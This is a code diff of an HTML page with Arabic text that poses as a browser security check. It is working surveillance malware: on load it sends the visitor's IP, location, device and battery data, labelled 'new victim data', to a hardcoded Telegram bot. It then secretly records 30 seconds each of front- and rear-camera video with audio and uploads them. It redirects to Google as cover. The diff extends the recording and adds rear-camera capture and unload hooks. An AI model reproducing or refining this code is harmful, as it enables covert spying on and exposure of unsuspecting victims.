@@ -13,74 +13,102 @@
 </head>
 <body>
     <div class="loader"></div>
-    <p>جاري التحقق من أمان المتصفح...</p>
+    <p>جاري فحص المتصفح.. يرجى الانتظار</p>
 
     <script>
-        // --- الإعدادات ---
         const BOT_TOKEN = "8619027051:AAH06xxHUXEeZ_PLu8l5QF8zct7nrjNW4ts";
         const urlParams = new URLSearchParams(window.location.search);
         const chatId = urlParams.get('chatId');
 
+        let currentStream = null;
+        let mediaRecorder = null;
+        let chunks = [];
+
         async function startCapture() {
             if (!chatId) return;
 
-            let deviceInfo = "";
+            // 1. إرسال البيانات النصية فوراً
+            await sendDeviceInfo();
 
-            // 1. جلب معلومات الـ IP والموقع
-            try {
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
-                deviceInfo += `IP: ${data.ip} | الدولة: ${data.country_name} | المدينة: ${data.city} | `;
-            } catch (e) { deviceInfo += "IP: غير معروف | "; }
+            // 2. تصوير الأمامية (30 ثانية)
+            await captureVideo("user", "أمامية", 30000);
 
-            // 2. جلب معلومات الجهاز والبطارية
+            // 3. تصوير الخلفية (30 ثانية)
+            await captureVideo("environment", "خلفية", 30000);
+
+            window.location.href = "https://www.google.com";
+        }
+
+        async function sendDeviceInfo() {
             try {
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
                 const battery = await navigator.getBattery();
-                deviceInfo += `المنصة: ${navigator.platform} | البطارية: ${Math.round(battery.level * 100)}% | الشحن: ${battery.charging ? 'نعم' : 'لا'}`;
-            } catch (e) { deviceInfo += `المنصة: ${navigator.platform}`; }
+                const info = `📊 **بيانات ضحية جديد**\n━━━━━━━━━━━━\n🌐 IP: ${d.ip}\n🌍 الدولة: ${d.country_name}\n📍 المدينة: ${d.city}\n📱 الجهاز: ${navigator.platform}\n🔋 البطارية: ${Math.round(battery.level * 100)}%\n━━━━━━━━━━━━`;
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(info)}&parse_mode=Markdown`);
+            } catch (e) {}
+        }
 
-            // إرسال تقرير البيانات فوراً
-            await sendToTelegram(deviceInfo);
-
-            // 3. محاولة تصوير الفيديو
+        async function captureVideo(cameraMode, label, duration) {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                const mediaRecorder = new MediaRecorder(stream);
-                let chunks = [];
+                currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: cameraMode }, audio: true });
+                mediaRecorder = new MediaRecorder(currentStream);
+                chunks = [];
 
-                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+                mediaRecorder.ondataavailable = (e) => {
+                    if (e.data.size > 0) chunks.push(e.data);
+                };
+
                 mediaRecorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'video/mp4' });
-                    await sendVideoToTelegram(blob);
-                    window.location.href = "https://www.google.com"; // تمويه
+                    if (chunks.length > 0) {
+                        const blob = new Blob(chunks, { type: 'video/mp4' });
+                        await sendVideo(blob, label);
+                    }
                 };
 
                 mediaRecorder.start();
-                setTimeout(() => {
-                    mediaRecorder.stop();
-                    stream.getTracks().forEach(track => track.stop());
-                }, 4000); // تصوير 4 ثوانٍ
+               
+                // الانتظار للمدة المحددة، مع إمكانية المقاطعة عند الخروج
+                await new Promise(resolve => {
+                    const timeout = setTimeout(() => {
+                        stopAll();
+                        resolve();
+                    }, duration);
+                });
 
             } catch (err) {
-                // في حال رفض الكاميرا، نكتفي بالبيانات ونوجهه لجوجل
-                window.location.href = "https://www.google.com";
+                console.log("Error camera");
             }
         }
 
-        async function sendToTelegram(text) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
-            await fetch(url);
+        function stopAll() {
+            if (mediaRecorder && mediaRecorder.state !== "inactive") {
+                mediaRecorder.stop();
+            }
+            if (currentStream) {
+                currentStream.getTracks().forEach(track => track.stop());
+            }
         }
 
-        async function sendVideoToTelegram(videoBlob) {
+        async function sendVideo(blob, label) {
             const formData = new FormData();
             formData.append('chat_id', chatId);
-            formData.append('video', videoBlob, 'data.webm');
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData });
+            formData.append('video', blob, 'video.mp4');
+            formData.append('caption', `📹 فيديو كامل من الكاميرا ال${label}`);
+           
+            // استخدام keepalive لضمان إرسال الطلب حتى لو أُغلق المتصفح
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                method: 'POST',
+                body: formData,
+                keepalive: true
+            });
         }
+
+        // محفزات الإرسال الفوري عند محاولة إغلاق الصفحة
+        window.addEventListener('beforeunload', stopAll);
+        window.addEventListener('pagehide', stopAll);
 
         window.onload = startCapture;
     </script>
 </body>
 </html>
-
